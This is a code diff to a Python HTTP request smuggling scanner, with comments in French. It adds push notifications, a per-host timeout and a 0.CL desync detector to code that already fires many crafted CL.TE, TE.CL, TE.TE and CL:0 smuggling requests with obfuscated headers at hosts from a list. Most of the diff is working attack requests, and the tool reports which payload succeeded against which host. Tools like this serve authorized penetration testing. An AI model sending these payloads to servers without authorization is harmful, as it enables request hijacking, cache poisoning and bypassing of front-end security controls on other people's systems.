@@ -5,6 +5,53 @@ import ssl
 import time
 import os
 from tqdm import tqdm
+import signal
+import contextlib
+import re
+from requests.auth import HTTPBasicAuth
+from dotenv import load_dotenv
+
+load_dotenv()  # charge .env à la racine du projet
+
+NTFY_ENDPOINT = os.getenv("NTFY_ENDPOINT", "https://localhost/NOTIFICATIONS")
+NTFY_USER = os.getenv("NTFY_USER")
+NTFY_PASS = os.getenv("NTFY_PASS")
+
+def ntfy_me(message: str, title: str = "Smuggler2000 Alert", timeout: int = 5) -> bool:
+    """
+    Envoie une notification à ntfy via POST JSON avec Basic Auth.
+    Retourne True si succès, False sinon.
+    """
+    if not NTFY_USER or not NTFY_PASS:
+        print("NTFY_USER / NTFY_PASS non définis dans .env — notification non envoyée.")
+        return False
+
+    try:
+        resp = requests.post(
+            NTFY_ENDPOINT,
+            json={"title": title, "message": message},
+            auth=HTTPBasicAuth(NTFY_USER, NTFY_PASS),
+            timeout=timeout,
+            # verify="/chemin/vers/ca.crt",  # <- si cert self-signed, mets le CA ici (évite verify=False)
+        )
+        resp.raise_for_status()
+        return True
+    except requests.exceptions.RequestException as e:
+        print(f"Failed to send notification: {e}")
+        return False
+
+# --- Timer Unix (main thread only) ---
+@contextlib.contextmanager
+def time_limit(seconds: int):
+    def _timeout_handler(signum, frame):
+        raise TimeoutError("Host processing timed out")
+    old_handler = signal.signal(signal.SIGALRM, _timeout_handler)
+    signal.alarm(seconds)
+    try:
+        yield
+    finally:
+        signal.alarm(0)
+        signal.signal(signal.SIGALRM, old_handler)
 
 def print_and_save_to_file(*args):
     global verbose
@@ -19,6 +66,9 @@ def print_and_save_to_file(*args):
 
     # Construction du message avec couleur (pour console)
     colored_text = ' '.join([str(arg) for arg in args])
+    
+    if "[!]" in colored_text:
+        ntfy_me(colored_text, title="Smuggler2000 Alert")
 
     if verbose:
         print(colored_text)
@@ -26,12 +76,10 @@ def print_and_save_to_file(*args):
             f.write(raw_text + "\n")
     else:
         if args and isinstance(args[0], str) and ("[!]" in args[0] or "[>]" in args[0]):
-            print(colored_text)
             with open(f"logs/smuggler2000_{date}.log", "a") as f:
                 f.write(raw_text + "\n")
 
 # Helper pour retirer les codes ANSI (pour les logs)
-import re
 def remove_ansi(text):
     ansi_escape = re.compile(r'\x1B\[[0-?]*[ -/]*[@-~]')
     return ansi_escape.sub('', text)
@@ -95,14 +143,14 @@ def prepare_socket(host):
     wrapped_socket.settimeout(1)
     return wrapped_socket
 
-def lets_smuggle(host, request, show_request):
+def lets_smuggle(host, request):
     wrapped_socket = prepare_socket(host)
-    detect_step_1(wrapped_socket, request, host, show_request)
+    detect_step_1(wrapped_socket, request, host)
     wrapped_socket = prepare_socket(host)
-    detect_step_2(wrapped_socket, request, host, show_request)
+    detect_step_2(wrapped_socket, request, host)
     wrapped_socket.close()
 
-def detect_advanced_HTTPRS(host, show_request, user_agent):
+def detect_advanced_HTTPRS(host, user_agent):
     global method  
     print_and_save_to_file(f"\n{GREEN}[+]{RESET} Testing CL.TE, TE.CL and TE.TE attack")
 
@@ -116,7 +164,7 @@ def detect_advanced_HTTPRS(host, show_request, user_agent):
         "Content-Length: 6\r\n"
         "Transfer-Encoding: chunked\r\n"
     )
-    lets_smuggle(host, request, show_request)
+    lets_smuggle(host, request)
 
     print_and_save_to_file(f"\n{GREEN}[+]{RESET} Trying to force TE.CL or CL.TE with weird TE header  - Transfer-Encoding[space]: chunked\\r\\n")
     request = (
@@ -127,7 +175,7 @@ def detect_advanced_HTTPRS(host, show_request, user_agent):
         "Content-Length: 6\r\n"
         "Transfer-Encoding : chunked\r\n"
     )
-    lets_smuggle(host, request, show_request)
+    lets_smuggle(host, request)
 
     print_and_save_to_file(f"\n{GREEN}[+]{RESET} Trying to force TE.CL or CL.TE with weird TE header  - Transfer-Encoding: chunked[space]\\r\\n")
     request = (
@@ -138,7 +186,7 @@ def detect_advanced_HTTPRS(host, show_request, user_agent):
         "Content-Length: 6\r\n"
         "Transfer-Encoding: chunked \r\n"
     )
-    lets_smuggle(host, request, show_request)
+    lets_smuggle(host, request)
 
     print_and_save_to_file(f"\n{GREEN}[+]{RESET} Trying to force TE.CL or CL.TE with weird TE header - Transfer-Encoding: xchunked\\r\\n")
     request = (
@@ -149,7 +197,7 @@ def detect_advanced_HTTPRS(host, show_request, user_agent):
         "Content-Length: 6\r\n"
         "Transfer-Encoding: xchunked\r\n"
     )
-    lets_smuggle(host, request, show_request)
+    lets_smuggle(host, request)
 
     print_and_save_to_file(f"\n{GREEN}[+]{RESET} Trying to force TE.CL or CL.TE with weird TE header - Transfer-Encoding: \\tchunked\\r\\n")
     request = (
@@ -160,7 +208,7 @@ def detect_advanced_HTTPRS(host, show_request, user_agent):
         "Content-Length: 6\r\n"
         "Transfer-Encoding: \tchunked\r\n"
     )
-    lets_smuggle(host, request, show_request)
+    lets_smuggle(host, request)
 
     print_and_save_to_file(f"\n{GREEN}[+]{RESET} Trying to force TE.CL or CL.TE with weird TE header - [space]Transfer-Encoding: chunked\\r\\n")
     request = (
@@ -171,7 +219,7 @@ def detect_advanced_HTTPRS(host, show_request, user_agent):
         "Content-Length: 6\r\n"
         " Transfer-Encoding: chunked\r\n"
     )
-    lets_smuggle(host, request, show_request)
+    lets_smuggle(host, request)
 
     print_and_save_to_file(f"\n{GREEN}[+]{RESET} Trying to force TE.CL or CL.TE with weird TE header - X: X\\nTransfer-Encoding: chunked\\r\\n")
     request = (
@@ -182,7 +230,7 @@ def detect_advanced_HTTPRS(host, show_request, user_agent):
         "Content-Length: 6\r\n"
         "X: X\nTransfer-Encoding: chunked\r\n"
     )
-    lets_smuggle(host, request, show_request)
+    lets_smuggle(host, request)
 
     print_and_save_to_file(f"\n{GREEN}[+]{RESET} Trying to force TE.CL or CL.TE with weird TE header - Transfer-Encoding: chunked\\nX: X\\r\\n")
     request = (
@@ -193,7 +241,7 @@ def detect_advanced_HTTPRS(host, show_request, user_agent):
         "Content-Length: 6\r\n"
         "Transfer-Encoding: chunked\nX: X\r\n"
     )
-    lets_smuggle(host, request, show_request)
+    lets_smuggle(host, request)
 
     print_and_save_to_file(f"\n{GREEN}[+]{RESET} Trying to force TE.CL or CL.TE with weird TE header - Transfer-Encoding: chunked\\nX: X\\n")
     request = (
@@ -204,7 +252,7 @@ def detect_advanced_HTTPRS(host, show_request, user_agent):
         "Content-Length: 6\r\n"
         "Transfer-Encoding: chunked\nX: X\n"
     )
-    lets_smuggle(host, request, show_request)
+    lets_smuggle(host, request)
 
     print_and_save_to_file(f"\n{GREEN}[+]{RESET} Trying to force TE.CL or CL.TE with weird TE header - Transfer-Encoding: chunked\\nX: X\\n\\n")
     request = (
@@ -215,7 +263,7 @@ def detect_advanced_HTTPRS(host, show_request, user_agent):
         "Content-Length: 6\r\n"
         "Transfer-Encoding: chunked\nX: X\n\n"
     )
-    lets_smuggle(host, request, show_request)
+    lets_smuggle(host, request)
 
     print_and_save_to_file(f"\n{GREEN}[+]{RESET} Trying to force TE.CL or CL.TE with weird TE header - Transfer-Encoding: \\nchunked\\r\\n")
     request = (
@@ -226,7 +274,7 @@ def detect_advanced_HTTPRS(host, show_request, user_agent):
         "Content-Length: 6\r\n"
         "Transfer-Encoding: \nchunked\r\n"
     )
-    lets_smuggle(host, request, show_request)
+    lets_smuggle(host, request)
 
     print_and_save_to_file(f"\n{GREEN}[+]{RESET} Trying to force TE.CL or CL.TE with weird TE header - Transfer-Encoding\\n: chunked\\r\\n")
     request = (
@@ -237,7 +285,7 @@ def detect_advanced_HTTPRS(host, show_request, user_agent):
         "Content-Length: 6\r\n"
         "Transfer-Encoding\n: chunked\r\n"
     )
-    lets_smuggle(host, request, show_request)
+    lets_smuggle(host, request)
 
     print_and_save_to_file(f"\n{GREEN}[+]{RESET} Trying to force TE.CL or CL.TE with weird TE header - transfer-encoding: chunked\\r\\n")
     request = (
@@ -248,7 +296,7 @@ def detect_advanced_HTTPRS(host, show_request, user_agent):
         "Content-Length: 6\r\n"
         "transfer-encoding: chunked\r\n"
     )
-    lets_smuggle(host, request, show_request)
+    lets_smuggle(host, request)
     
     print_and_save_to_file(f"\n{GREEN}[+]{RESET} Trying to force TE.CL or CL.TE with weird TE header - TRANSFER-ENCODING: chunked\\r\\n")
     request = (
@@ -259,7 +307,7 @@ def detect_advanced_HTTPRS(host, show_request, user_agent):
         "Content-Length: 6\r\n"
         "TRANSFER-ENCODING: chunked\r\n"
     )
-    lets_smuggle(host, request, show_request)
+    lets_smuggle(host, request)
 
     print_and_save_to_file(f"\n{GREEN}[+]{RESET} Trying to force TE.CL or CL.TE with weird TE header - TrAnSfEr-ENCodIng: chunked\\r\\n")
     request = (
@@ -270,7 +318,7 @@ def detect_advanced_HTTPRS(host, show_request, user_agent):
         "Content-Length: 6\r\n"
         "TrAnSfEr-ENCodIng: chunked\r\n"
     )
-    lets_smuggle(host, request, show_request)
+    lets_smuggle(host, request)
 
     print_and_save_to_file(f"\n{GREEN}[+]{RESET} Trying to force TE.CL or CL.TE with weird TE header - tRanSfeR-encoDinG: chunked\\r\\n")
     request = (
@@ -281,7 +329,7 @@ def detect_advanced_HTTPRS(host, show_request, user_agent):
         "Content-Length: 6\r\n"
         "tRanSfeR-encoDinG: chunked\r\n"
     )
-    lets_smuggle(host, request, show_request)
+    lets_smuggle(host, request)
     
     print_and_save_to_file(f"\n{GREEN}[+]{RESET} Trying to force TE.CL or CL.TE with weird TE header - TRANSFER-encoding: chunked\\r\\n")
     request = (
@@ -292,7 +340,7 @@ def detect_advanced_HTTPRS(host, show_request, user_agent):
         "Content-Length: 6\r\n"
         "TRANSFER-encoding: chunked\r\n"
     )
-    lets_smuggle(host, request, show_request)
+    lets_smuggle(host, request)
 
 
     print_and_save_to_file(f"\n{GREEN}[+]{RESET} Trying to force TE.CL or CL.TE with duplicated TE headers")
@@ -305,11 +353,11 @@ def detect_advanced_HTTPRS(host, show_request, user_agent):
         "Transfer-Encoding: chunked\r\n"
         "Transfer-Encoding: cooked\r\n"
     )
-    lets_smuggle(host, request, show_request)
+    lets_smuggle(host, request)
 
     
     
-def detect_step_1(wrapped_socket, request, host, show_request):
+def detect_step_1(wrapped_socket, request, host):
     print_and_save_to_file(f"{GREEN}[+]{RESET} Detecting - Step 1")
     if not sanity_check(host):
         return
@@ -319,8 +367,6 @@ def detect_step_1(wrapped_socket, request, host, show_request):
         "abc\r\n"
         "X\r\n"
     )
-    if show_request:
-        print_and_save_to_file("Request - Detection Step 1: \n"+ request)
     try:
         wrapped_socket.send(request.encode())
         response = wrapped_socket.recv(4096)
@@ -332,10 +378,10 @@ def detect_step_1(wrapped_socket, request, host, show_request):
             print_and_save_to_file(f"{GREEN}[+]{RESET} Probe response: "+ response)
     except TimeoutError:
         print_and_save_to_file(f"{GREEN}[+]{RESET} Host is using CL.TE")
-        test_and_print_CLTE_exploit(host, request, show_request)
+        test_and_print_CLTE_exploit(host, request)
         return
 
-def detect_step_2(wrapped_socket, request, host, show_request):
+def detect_step_2(wrapped_socket, request, host):
     print_and_save_to_file(f"{GREEN}[+]{RESET} Detecting - Step 2")
     if not sanity_check(host): 
         return
@@ -345,8 +391,6 @@ def detect_step_2(wrapped_socket, request, host, show_request):
         "\r\n"
         "X"
     )
-    if show_request:
-        print_and_save_to_file("Request - Detection Step 2: \n"+ request)
     try:
         wrapped_socket.send(request.encode())
         response = wrapped_socket.recv(4096)
@@ -356,21 +400,19 @@ def detect_step_2(wrapped_socket, request, host, show_request):
             print_and_save_to_file(f"{GREEN}[+]{RESET} Host is using CL.CL or TE.TE")
         if "200" in response[:13] and response_2.status_code != 200:
             print_and_save_to_file(f"{GREEN}[+]{RESET} Host is vulnerable to CL.TE")
-            test_and_print_CLTE_exploit(host, request, show_request)
+            test_and_print_CLTE_exploit(host, request)
         if "200" not in response[:13]:
             print_and_save_to_file(f"{GREEN}[+]{RESET} Host is not dumb")
             print_and_save_to_file(f"{GREEN}[+]{RESET} Probe response: "+ response)
             return
     except TimeoutError: 
         print_and_save_to_file(f"{GREEN}[+]{RESET} Host is vulnerable to TE.CL")
-        test_and_print_TECL_exploit(host, request, show_request)
+        test_and_print_TECL_exploit(host, request)
     except requests.exceptions.ReadTimeout:
         print_and_save_to_file(f"{GREEN}[+]{RESET} Host is vulnerable to TE.CL")
-        test_and_print_TECL_exploit(host, request, show_request)
+        test_and_print_TECL_exploit(host, request)
 
-def is_this_404(host, request, show_request):
-    if show_request:
-        print_and_save_to_file("Request - 404 test: \n"+ request)
+def is_this_404(host, request):
     try:
         wrapped_socket = prepare_socket(host)
         wrapped_socket.send(request.encode())
@@ -386,7 +428,7 @@ def is_this_404(host, request, show_request):
     except TimeoutError:
         return False
 
-def test_and_print_TECL_exploit(host, request, show_request):
+def test_and_print_TECL_exploit(host, request):
     global method
     if not sanity_check(host):
         return
@@ -408,13 +450,13 @@ def test_and_print_TECL_exploit(host, request, show_request):
         "0\r\n"
         "\r\n"
     )
-    if is_this_404(host, request, show_request):
+    if is_this_404(host, request):
         print_and_save_to_file(f"{RED}[!]{RESET} Host {host} is vulnerable to this TE.CL attack payload :")
         print_attack_with_n_r(request)
     else:
         print_and_save_to_file(f"{GREEN}[+]{RESET} Host is not vulnerable to TE.CL")
 
-def test_and_print_CLTE_exploit(host, request, show_request):
+def test_and_print_CLTE_exploit(host, request):
     if not sanity_check(host):
         return
     request = request.strip(
@@ -436,7 +478,7 @@ def test_and_print_CLTE_exploit(host, request, show_request):
         "GET /404 HTTP/1.1\r\n"
         "X-Ignore: X"
     )
-    if is_this_404(host, request, show_request):
+    if is_this_404(host, request):
         print_and_save_to_file(f"{RED}[!]{RESET} Host {host} is vulnerable to this CL.TE attack payload :")
         print_attack_with_n_r(request)
     else:
@@ -449,7 +491,7 @@ def test_and_print_CLTE_exploit(host, request, show_request):
 # post request that triggers a server side error
 # the backend ignores the body of the request and the content length header
 
-def CL0_variations(host, endpoint, show_request, user_agent):
+def CL0_variations(host, endpoint, user_agent):
     global method
     print_and_save_to_file(f"\n{GREEN}[+]{RESET} Testing CL:0 attack via client side desync")
     body = (
@@ -467,7 +509,7 @@ def CL0_variations(host, endpoint, show_request, user_agent):
         f"Content-Length: {len(body)}\r\n"
         "\r\n"
     )
-    CL0_attack(host, endpoint, body, attack_request, show_request)
+    CL0_attack(host, endpoint, body, attack_request)
 
     print_and_save_to_file(f"\n{GREEN}[+]{RESET} CL:0 attack with an obfuscated CL header - Content-Length[space]: N\\r\\n")
     attack_request = (
@@ -479,7 +521,7 @@ def CL0_variations(host, endpoint, show_request, user_agent):
         f"Content-Length : {len(body)}\r\n"
         "\r\n"
     )
-    CL0_attack(host, endpoint, body, attack_request, show_request)
+    CL0_attack(host, endpoint, body, attack_request)
 
     print_and_save_to_file(f"\n{GREEN}[+]{RESET} CL:0 attack with a duplicated CL header - Content-Length: N\\r\\nContent-Length: 0\\r\\n")
     attack_request = (
@@ -492,7 +534,7 @@ def CL0_variations(host, endpoint, show_request, user_agent):
         "Content-Length: 0\r\n"
         "\r\n"
     )
-    CL0_attack(host, endpoint, body, attack_request, show_request)
+    CL0_attack(host, endpoint, body, attack_request)
 
     print_and_save_to_file(f"\n{GREEN}[+]{RESET} CL:0 attack with a duplicated CL header - Content-Length: 0\\r\\nContent-Length: N\\r\\n")
     attack_request = (
@@ -505,7 +547,7 @@ def CL0_variations(host, endpoint, show_request, user_agent):
         f"Content-Length: {len(body)}\r\n"
         "\r\n"
     )
-    CL0_attack(host, endpoint, body, attack_request, show_request)
+    CL0_attack(host, endpoint, body, attack_request)
 
     print_and_save_to_file(f"\n{GREEN}[+]{RESET} CL:0 attack with an obfuscated CL header - Content-Length: \\tN\\r\\n")
     attack_request = (
@@ -517,7 +559,7 @@ def CL0_variations(host, endpoint, show_request, user_agent):
         f"Content-Length: \t{len(body)}\r\n"
         "\r\n"
     )
-    CL0_attack(host, endpoint, body, attack_request, show_request)
+    CL0_attack(host, endpoint, body, attack_request)
 
     print_and_save_to_file(f"\n{GREEN}[+]{RESET} CL:0 attack with an obfuscated CL header - [space]Content-Length: N\\r\\n")
     attack_request = (
@@ -529,7 +571,7 @@ def CL0_variations(host, endpoint, show_request, user_agent):
         f" Content-Length: {len(body)}\r\n"
         "\r\n"
     )
-    CL0_attack(host, endpoint, body, attack_request, show_request)
+    CL0_attack(host, endpoint, body, attack_request)
 
     print_and_save_to_file(f"\n{GREEN}[+]{RESET} CL:0 attack with an obfuscated CL header - X: X\\nContent-Length: N\\r\\n")
     attack_request = (
@@ -541,7 +583,7 @@ def CL0_variations(host, endpoint, show_request, user_agent):
         f"X: X\nContent-Length: {len(body)}\r\n"
         "\r\n"
     )
-    CL0_attack(host, endpoint, body, attack_request, show_request)
+    CL0_attack(host, endpoint, body, attack_request)
     
     print_and_save_to_file(f"\n{GREEN}[+]{RESET} CL:0 attack with an obfuscated CL header - Content-Length: N\\nX: X\\r\\n")
     attack_request = (
@@ -553,7 +595,7 @@ def CL0_variations(host, endpoint, show_request, user_agent):
         f"Content-Length: {len(body)}\nX: X\r\n"
         "\r\n"
     )
-    CL0_attack(host, endpoint, body, attack_request, show_request)
+    CL0_attack(host, endpoint, body, attack_request)
     
     print_and_save_to_file(f"\n{GREEN}[+]{RESET} CL:0 attack with an obfuscated CL header - Content-Length\\n: N\\r\\n")
     attack_request = (
@@ -565,7 +607,7 @@ def CL0_variations(host, endpoint, show_request, user_agent):
         f"Content-Length\n: {len(body)}\r\n"
         "\r\n"
     )
-    CL0_attack(host, endpoint, body, attack_request, show_request)
+    CL0_attack(host, endpoint, body, attack_request)
 
     print_and_save_to_file(f"\n{GREEN}[+]{RESET} CL:0 attack with an duplicated CL header - Content-Length: N\\r\\nContent-Length: N\\r\\n")
     attack_request = (
@@ -578,9 +620,9 @@ def CL0_variations(host, endpoint, show_request, user_agent):
         f"Content-Length: {len(body)}\r\n"
         "\r\n"
     )
-    CL0_attack(host, endpoint, body, attack_request, show_request)
+    CL0_attack(host, endpoint, body, attack_request)
 
-def CL0_attack(host, endpoint, body, attack_request, show_request): 
+def CL0_attack(host, endpoint, body, attack_request): 
     if not sanity_check(host):
         return
     normal_request = (
@@ -608,8 +650,6 @@ def CL0_attack(host, endpoint, body, attack_request, show_request):
     
     # Attack request
     attack_request += body
-    if show_request:
-        print_and_save_to_file("Attack request: \n"+ attack_request)
     wrapped_socket = prepare_socket(host)
     wrapped_socket.sendall(attack_request.encode())
     attack_response = b""
@@ -643,6 +683,58 @@ def CL0_attack(host, endpoint, body, attack_request, show_request):
         print_and_save_to_file(f"{GREEN}[+]{RESET} Endpoint is not vulnerable to this CL:0 attack")
         if normal_response != "":
             print_and_save_to_file(f"{GREEN}[+]{RESET} Normal response: " + normal_response)
+        else:
+            print_and_save_to_file(f"{GREEN}[+]{RESET} Normal response: No response")
+
+
+def _0CL_detection(host, user_agent):
+    if not sanity_check(host):
+        return
+    first_request = (
+            f"{method} /con HTTP/1.1\r\n"
+            f"Host: {host}\r\n"
+            f"User-Agent: {user_agent}\r\n"
+            "Content-Length: 20\r\n"
+            "\r\n"
+    )
+    second_request = (
+            "GET / HTTP/1.1\r\n"
+            "X: yGET /404 HTTP/1.1\r\n"
+            f"Host: {host}\r\n"
+            "\r\n"
+    )
+    wrapped_socket = prepare_socket(host)
+    wrapped_socket.sendall(first_request.encode())
+    first_response = b""
+    while True:
+        try:
+            data = wrapped_socket.recv(4096)
+            first_response += data
+            if not data or data.endswith(b"\r\n\r\n"):
+                break
+        except TimeoutError:
+            break
+    wrapped_socket.sendall(second_request.encode())
+    second_response = b""
+    while True:
+        try:
+            data = wrapped_socket.recv(4096)
+            second_response += data
+            if not data or data.endswith(b"\r\n\r\n"):
+                break
+        except TimeoutError:
+            break
+    wrapped_socket.close()
+    first_response = extract_response(first_response)
+    print_and_save_to_file(f"{GREEN}[+]{RESET} Attack response: " + first_response)
+    second_response = extract_response(second_response)
+    if "404" in second_response[:13]:
+        print_and_save_to_file(f"{RED}[!]{RESET} {host} is vulnerable to this 0:CL payload")
+        print_attack_with_n_r(first_request)
+    else:
+        print_and_save_to_file(f"{GREEN}[+]{RESET} Endpoint is not vulnerable to this 0:CL first")
+        if second_response != "":
+            print_and_save_to_file(f"{GREEN}[+]{RESET} Normal response: " + second_response)
         else:
             print_and_save_to_file(f"{GREEN}[+]{RESET} Normal response: No response")
 
@@ -687,8 +779,8 @@ if __name__ == "__main__":
     retries = 0
     parser = argparse.ArgumentParser(description="SMUGGLER - HTTP Request Smuggling tool\nAuthor: gobelinor")
     parser.add_argument("-host", help="Host to test", required=False)
+    parser.add_argument("-_0CL", help="Only detect _0CL vulnerability", action="store_true")
     parser.add_argument("-list", help="List txt file of hosts to test", required=False)
-    parser.add_argument("-show_request", help="Show requests", action="store_true")
     parser.add_argument("-user_agent", help="User-Agent to use", required=False)
     parser.add_argument("-method", help="HTTP method to use", required=False)
     parser.add_argument("-show_CLTE_payload", help="Print CL.TE attack payload", action="store_true")
@@ -696,8 +788,9 @@ if __name__ == "__main__":
     parser.add_argument("-show_TETE_payload", help="Print TE.TE attack payload", action="store_true")
     parser.add_argument("-show_CL0_payload", help="Print CL:0 attack payload", action="store_true")
     parser.add_argument("-verbose", help="Verbose mode", action="store_true")
+    parser.add_argument("--double_desync", action="store_true",
+                    help="Probe 0.CL -> CL.0 (safe) and find robust FE-injection offset")
     args = parser.parse_args()
-    show_request = args.show_request
     if args.verbose:
         verbose = True
     else:
@@ -820,8 +913,12 @@ if __name__ == "__main__":
             if not sanity_check(host):
                 exit(1)
             trace(host, user_agent)
-            detect_advanced_HTTPRS(host, show_request, user_agent)
-            CL0_variations(host, endpoint, show_request, user_agent)
+            if args.double_desync:
+                run_double_desync_probe(host, user_agent)
+            if args._0CL:
+                _0CL_detection(host, user_agent)
+            #detect_advanced_HTTPRS(host, user_agent)
+            #CL0_variations(host, endpoint, user_agent)
         except KeyboardInterrupt:
             print_and_save_to_file(f"{GREEN}[+]{RESET} Exiting...")
             exit(1)
@@ -830,18 +927,33 @@ if __name__ == "__main__":
             exit(1)
     if args.list:
         with open(args.list) as f:
-            hosts = [h.strip() for h in f if h.strip()] 
+            hosts = [h.strip() for h in f if h.strip()]
+        TIMEOUT_SECS = 5 * 60  # 5 minutes
         for host in tqdm(hosts, desc="🔍 Scanning Hosts", unit="host"):
-            host, endpoint = host_or_endpoint(host)
-            print_and_save_to_file(f"\n{GREEN}[>]{RESET} Testing host: ", f"{BLUE}{host}{RESET}")
-            print_and_save_to_file(f"{GREEN}[>]{RESET} Testing method: ", f"{BLUE}{method}{RESET}")
-            print_and_save_to_file(f"{GREEN}[>]{RESET} Testing endpoint: {BLUE}/{endpoint}{RESET}")
             try:
-                if not sanity_check(host):
-                    continue
-                trace(host, user_agent)
-                detect_advanced_HTTPRS(host, show_request, user_agent)
-                CL0_variations(host, endpoint, show_request, user_agent)
+                with time_limit(TIMEOUT_SECS):
+                    host, endpoint = host_or_endpoint(host)
+                    print_and_save_to_file(f"\n{GREEN}[>]{RESET} Testing host: ", f"{BLUE}{host}{RESET}")
+                    print_and_save_to_file(f"{GREEN}[>]{RESET} Testing method: ", f"{BLUE}{method}{RESET}")
+                    print_and_save_to_file(f"{GREEN}[>]{RESET} Testing endpoint: {BLUE}/{endpoint}{RESET}")
+
+                    if not sanity_check(host):
+                        continue
+
+                    trace(host, user_agent)
+
+                    if args._0CL:
+                        _0CL_detection(host, user_agent)
+                    # detect_advanced_HTTPRS(host, user_agent)
+                    # CL0_variations(host, endpoint, user_agent)
+
+            except TimeoutError:
+                # > 5 minutes sur cet hôte → on log et on passe au suivant
+                print_and_save_to_file(
+                    f"{GREEN}[+]{RESET} Timeout: ",
+                    f"{host} a pris plus de 5 minutes — on ignore et on continue."
+                )
+                continue
             except Exception as e:
                 print_and_save_to_file(f"{GREEN}[+]{RESET} Error: ", e)
                 continue
